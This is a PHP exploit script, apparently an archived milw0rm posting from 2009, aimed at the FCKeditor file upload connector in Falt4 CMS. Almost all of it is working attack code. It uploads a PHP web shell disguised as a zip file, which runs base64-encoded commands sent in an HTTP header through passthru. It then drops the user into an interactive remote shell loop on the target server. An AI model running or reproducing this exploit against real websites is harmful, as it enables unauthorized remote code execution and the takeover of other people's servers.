<html><head><title>Falt4 CMS RC4 (fckeditor) Arbitrary File Upload Exploit</title></head><pre>################################################################
#
# Falt4 CMS (fckeditor) Arbitrary File Upload Exploit
#
# Bug Discovered By : Sp3shial
#
# Sp3shial@ymail.com
#
# Persian Boys Hacking Team From A Land With A History-Long Background
#
# Download CMS : http://downloads.sourceforge.net/falt4/falt4extreme.zip?modtime=1196845455&amp;big_mirror=0
#
###############################################################

error_reporting(0);
set_time_limit(0);
ini_set(&quot;default_socket_timeout&quot;, 5);

define(STDIN, fopen(&quot;php://stdin&quot;, &quot;r&quot;));

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print &quot;\n[-] No response from {$host}:80 Trying again...&quot;;
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

function connector_response($html)
{
	return (preg_match(&quot;/OnUploadCompleted\((\d),\&quot;(.*)\&quot;\)/&quot;, $html, $match) &amp;&amp; in_array($match[1], array(0, 201)));
}

print &quot;\n+------------------------------------------------------------------+&quot;;
print &quot;\n| Falt4 CMS (fckeditor) Arbitrary File Upload Exploit by Sp3shial  |&quot;;
print &quot;\n+------------------------------------------------------------------+\n&quot;;

if ($argc &lt; 3)
{
	print &quot;\nUsage......: php $argv[0] host path&quot;;
	print &quot;\nExample....: php $argv[0] localhost /&quot;;
	print &quot;\nExample....: php $argv[0] localhost /Falt4/\n&quot;;
	die();
}

$host = $argv[1];
$path = ereg_replace(&quot;(/){2,}&quot;, &quot;/&quot;, $argv[2]);

$filename  = md5(time()).&quot;.php&quot;;
$connector = &quot;modules/newsletter/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php&quot;;

$payload  = &quot;--o0oOo0o\r\n&quot;;
$payload .= &quot;Content-Disposition: form-data; name=\&quot;NewFile\&quot;; filename=\&quot;{$filename}\&quot;\r\n&quot;;
$payload .= &quot;Content-Type: application/zip\r\n\r\n&quot;;
$payload .= &quot;PK\003\004&lt;?php error_reporting(0);print(\&quot;_code_\\n\&quot;);passthru(base64_decode(\$_SERVER[HTTP_CMD])); ?&gt;\n&quot;;
$payload .= &quot;--o0oOo0o--\r\n&quot;;

$packet	 = &quot;POST {$path}{$connector}?Command=FileUpload&amp;Type=File&amp;CurrentFolder=%2f HTTP/1.0\r\n&quot;;
$packet	.= &quot;Host: {$host}\r\n&quot;;
$packet .= &quot;Content-Length: &quot;.strlen($payload).&quot;\r\n&quot;;
$packet .= &quot;Content-Type: multipart/form-data; boundary=o0oOo0o\r\n&quot;;
$packet .= &quot;Connection: close\r\n\r\n&quot;;
$packet .= $payload;

if (!connector_response(http_send($host, $packet))) die(&quot;\n[-] Upload failed!\n&quot;);
else print &quot;\n[-] Shell uploaded to {$filename}...starting it!\n&quot;;

$path .= str_repeat(&quot;../&quot;, substr_count($path, &quot;/&quot;) - 1) . &quot;UserFiles/File/&quot;; // come back to the document root 

$packet  = &quot;GET {$path}{$filename} HTTP/1.0\r\n&quot;;
$packet .= &quot;Host: {$host}\r\n&quot;;
$packet .= &quot;Cmd: %s\r\n&quot;;
$packet .= &quot;Connection: close\r\n\r\n&quot;;

while(1)
{
	print &quot;\nFalt4-shell# &quot;;
	$cmd = trim(fgets(STDIN));
	if ($cmd != &quot;exit&quot;)
	{
		$response = http_send($host, sprintf($packet, base64_encode($cmd)));
		preg_match(&quot;/_code_/&quot;, $response) ? print array_pop(explode(&quot;_code_&quot;, $response)) : die(&quot;\n[-] Exploit failed...\n&quot;);
	}
	else break;
}

?&gt;

# milw0rm.com [2009-02-16]</pre></html>